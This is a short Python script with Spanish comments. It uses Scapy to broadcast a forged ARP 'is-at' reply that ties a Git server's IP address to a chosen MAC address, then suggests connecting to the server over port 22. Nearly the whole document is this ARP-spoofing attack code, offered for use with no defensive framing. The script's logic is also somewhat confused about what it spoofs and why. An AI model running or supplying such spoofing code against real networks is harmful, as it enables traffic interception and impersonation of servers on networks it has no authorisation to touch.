from scapy.all import Ether, ARP, sendp
import time

# Dirección MAC original del dispositivo que queremos spoofear
original_mac = "00:11:22:33:44:55"

# Dirección IP del servidor Git (ejemplo)
git_server_ip = "192.168.1.100"

# Puerto del servidor Git
git_server_port = 22  # Puedes cambiarlo según tu configuración

# Crear un paquete ARP para realizar el spoofing de MAC
spoofed_packet = Ether(src=original_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(
    op="is-at", psrc=git_server_ip, hwsrc=original_mac
)

# Enviar el paquete de spoofing
sendp(spoofed_packet, iface="tu_interfaz_de_red")

# Esperar un tiempo para permitir que el spoofing tenga efecto
time.sleep(5)

# Ahora intenta conectarte al servidor Git en el puerto específico
# Puedes usar tu cliente Git preferido o herramientas como telnet
# por ejemplo, usando la terminal: `telnet 192.168.1.100 22`
